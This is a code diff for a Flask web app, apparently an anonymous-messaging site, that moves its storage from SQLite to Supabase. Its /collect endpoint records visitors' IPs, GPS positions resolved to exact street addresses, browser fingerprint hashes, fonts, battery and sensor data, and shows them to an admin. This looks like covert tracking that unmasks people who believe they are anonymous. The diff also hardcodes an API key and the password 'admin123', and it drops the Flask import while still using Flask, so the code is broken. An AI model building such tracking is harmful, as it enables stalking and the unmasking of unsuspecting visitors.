@@ -1,83 +1,15 @@
-import sqlite3
+from supabase import create_client, Client
 import os
-import json
-import requests
-from flask import Flask, render_template, request, jsonify, g, session, redirect, url_for
 
 app = Flask(__name__)
-app.secret_key = 'super-secret-key-change-this' # يمكنك تغيير هذا لاحقاً
-DATABASE = 'sarhne_final.db'
-ADMIN_PASSWORD = 'admin123' # كلمة المرور الافتراضية
+app.secret_key = 'super-secret-key-change-this' 
+ADMIN_PASSWORD = 'admin123' 
 
-def get_db():
-    db = getattr(g, '_database', None)
-    if db is None:
-        db = g._database = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row
-    return db
+SUPABASE_URL = "https://htrqocasllkejwyrhxma.supabase.co"
+SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh0cnFvY2FzbGxrZWp3eXJoeG1hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMxNTI1NjUsImV4cCI6MjA4ODcyODU2NX0.8axR4UC0TSySPSkadW3Vr9kB8M6AglXPiTKlrVrSYrk"
+supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 
-@app.teardown_appcontext
-def close_connection(exception):
-    db = getattr(g, '_database', None)
-    if db is not None:
-        db.close()
-
-def init_db():
-    with app.app_context():
-        db = get_db()
-        db.cursor().execute('''
-            CREATE TABLE IF NOT EXISTS visitors (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                action_type TEXT,
-                message TEXT,
-                ip_address TEXT,
-                local_ip TEXT,
-                ip_country TEXT,
-                ip_city TEXT,
-                ip_isp TEXT,
-                ip_lat TEXT,
-                ip_lon TEXT,
-                exact_address TEXT,
-                gps_accuracy TEXT,
-                user_agent TEXT,
-                browser_name TEXT,
-                os_name TEXT,
-                device_type TEXT,
-                screen_resolution TEXT,
-                color_depth TEXT,
-                timezone TEXT,
-                timezone_offset TEXT,
-                sensor_data TEXT,
-                social_media TEXT,
-                fonts TEXT,
-                language TEXT,
-                languages_all TEXT,
-                platform TEXT,
-                cpu_cores TEXT,
-                ram_gb TEXT,
-                gpu_vendor TEXT,
-                gpu_renderer TEXT,
-                canvas_hash TEXT,
-                webgl_hash TEXT,
-                audio_hash TEXT,
-                connection_type TEXT,
-                connection_speed TEXT,
-                battery_level TEXT,
-                battery_charging TEXT,
-                touch_support TEXT,
-                cookie_enabled TEXT,
-                do_not_track TEXT,
-                ad_blocker TEXT,
-                webdriver TEXT,
-                plugins TEXT,
-                referrer TEXT,
-                page_url TEXT,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        ''')
-        db.commit()
-
-init_db()
+# No local DB init needed for Supabase
 
 def reverse_geocode(lat, lon):
     """Convert Lat/Lon into a real-world address (village, street, city) using OpenStreetMap"""
@@ -155,11 +87,12 @@ def parse_user_agent(ua_string):
 
 @app.route('/', methods=['GET', 'POST'])
 def home():
-    db = get_db()
-    res = db.execute("SELECT COUNT(*) as count FROM visitors WHERE action_type='PAGE_VISIT'").fetchone()
-    count = res['count'] if res else 2339
+    try:
+        res = supabase.table("visitors").select("id", count="exact").eq("action_type", "PAGE_VISIT").execute()
+        count = res.count if res.count else 2339
+    except:
+        count = 2339
     
-    # We always render home.html. AJAX handles the rest.
     return render_template('home.html', success=False, visits_count=count)
     
 @app.route('/collect', methods=['POST'])
@@ -178,13 +111,20 @@ def collect():
         acc = data.get('acc')
         address = reverse_geocode(lat, lon)
         
-        # We find the latest log for this canvasHash and update it with the true GPS
-        db.execute('''
-            UPDATE visitors 
-            SET ip_lat = ?, ip_lon = ?, exact_address = ?, gps_accuracy = ? 
-            WHERE id = (SELECT id FROM visitors WHERE canvas_hash = ? ORDER BY id DESC LIMIT 1)
-        ''', (lat, lon, address, f"Within {acc} meters", visitor_canvas))
-        db.commit()
+        try:
+            # Find the latest log for this canvasHash and update it
+            latest = supabase.table("visitors").select("id").eq("canvas_hash", visitor_canvas).order("id", desc=True).limit(1).execute()
+            if latest.data:
+                target_id = latest.data[0]['id']
+                supabase.table("visitors").update({
+                    "ip_lat": str(lat),
+                    "ip_lon": str(lon),
+                    "exact_address": address,
+                    "gps_accuracy": f"Within {acc} meters"
+                }).eq("id", target_id).execute()
+        except Exception as e:
+            print("Supabase Update Error:", e)
+            
         return jsonify({"status": "gps_updated"})
 
     # 2. Otherwise it's a PAGE_VISIT or MESSAGE_SENT
@@ -208,33 +148,53 @@ def collect():
     ua = request.user_agent.string
     browser, os_name, device = parse_user_agent(ua)
     
-    db.execute('''
-        INSERT INTO visitors (
-            action_type, message, ip_address, local_ip, ip_country, ip_city, ip_isp, ip_lat, ip_lon, exact_address, gps_accuracy,
-            user_agent, browser_name, os_name, device_type,
-            screen_resolution, color_depth, timezone, timezone_offset, sensor_data, social_media, fonts, language, languages_all,
-            platform, cpu_cores, ram_gb, gpu_vendor, gpu_renderer,
-            canvas_hash, webgl_hash, audio_hash,
-            connection_type, connection_speed, battery_level, battery_charging,
-            touch_support, cookie_enabled, do_not_track, ad_blocker, webdriver,
-            plugins, referrer, page_url
-        ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
-    ''', (
-        action, message, ip, data.get('localIp', 'Unknown'), ip_info['country'], ip_info['city'], ip_info['isp'], lat, lon, address, gps_acc,
-        ua, browser, os_name, device,
-        data.get('screen', ''), data.get('colorDepth', ''), data.get('timezone', ''), data.get('timezoneOffset', ''), data.get('sensorData', ''),
-        data.get('social', ''), data.get('fonts', ''),
-        data.get('language', ''), data.get('languages', ''),
-        data.get('platform', ''), data.get('cpuCores', ''), data.get('ram', ''),
-        data.get('gpuVendor', ''), data.get('gpuRenderer', ''),
-        data.get('canvasHash', ''), data.get('webglHash', ''), data.get('audioHash', ''),
-        data.get('connectionType', ''), data.get('connectionSpeed', ''),
-        data.get('batteryLevel', ''), data.get('batteryCharging', ''),
-        data.get('touchSupport', ''), data.get('cookieEnabled', ''),
-        data.get('doNotTrack', ''), data.get('adBlocker', ''), data.get('webdriver', ''),
-        data.get('plugins', ''), data.get('referrer', ''), data.get('pageUrl', '')
-    ))
-    db.commit()
+    supabase.table("visitors").insert({
+        "action_type": action,
+        "message": message,
+        "ip_address": ip,
+        "local_ip": str(data.get('localIp', 'Unknown')),
+        "ip_country": ip_info['country'],
+        "ip_city": ip_info['city'],
+        "ip_isp": ip_info['isp'],
+        "ip_lat": str(lat),
+        "ip_lon": str(lon),
+        "exact_address": address,
+        "gps_accuracy": gps_acc,
+        "user_agent": ua,
+        "browser_name": browser,
+        "os_name": os_name,
+        "device_type": device,
+        "screen_resolution": str(data.get('screen', '')),
+        "color_depth": str(data.get('colorDepth', '')),
+        "timezone": str(data.get('timezone', '')),
+        "timezone_offset": str(data.get('timezoneOffset', '')),
+        "sensor_data": str(data.get('sensorData', '')),
+        "social_media": str(data.get('social', '')),
+        "fonts": str(data.get('fonts', '')),
+        "language": str(data.get('language', '')),
+        "languages_all": str(data.get('languages', '')),
+        "platform": str(data.get('platform', '')),
+        "cpu_cores": str(data.get('cpuCores', '')),
+        "ram_gb": str(data.get('ram', '')),
+        "gpu_vendor": str(data.get('gpuVendor', '')),
+        "gpu_renderer": str(data.get('gpuRenderer', '')),
+        "canvas_hash": str(data.get('canvasHash', '')),
+        "webgl_hash": str(data.get('webglHash', '')),
+        "audio_hash": str(data.get('audioHash', '')),
+        "connection_type": str(data.get('connectionType', '')),
+        "connection_speed": str(data.get('connectionSpeed', '')),
+        "battery_level": str(data.get('batteryLevel', '')),
+        "battery_charging": str(data.get('batteryCharging', '')),
+        "touch_support": str(data.get('touchSupport', '')),
+        "cookie_enabled": str(data.get('cookieEnabled', '')),
+        "do_not_track": str(data.get('doNotTrack', '')),
+        "ad_blocker": str(data.get('adBlocker', '')),
+        "webdriver": str(data.get('webdriver', '')),
+        "plugins": str(data.get('plugins', '')),
+        "referrer": str(data.get('referrer', '')),
+        "page_url": str(data.get('pageUrl', ''))
+    }).execute()
+    
     return jsonify({"status": "ok"})
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -256,16 +216,16 @@ def logout():
 def admin():
     if not session.get('logged_in'):
         return redirect(url_for('login'))
-    db = get_db()
-    visitors = db.execute("SELECT * FROM visitors ORDER BY created_at DESC").fetchall()
+    res = supabase.table("visitors").select("*").order("created_at", desc=True).execute()
+    visitors = res.data
     return render_template('admin.html', visitors=visitors)
 
 @app.route('/dashboard')
 def dashboard():
     if not session.get('logged_in'):
         return redirect(url_for('login'))
-    db = get_db()
-    visitors = db.execute("SELECT * FROM visitors ORDER BY created_at DESC").fetchall()
+    res = supabase.table("visitors").select("*").order("created_at", desc=True).execute()
+    visitors = res.data
     return render_template('dashboard.html', visitors=visitors)
 
 if __name__ == '__main__':
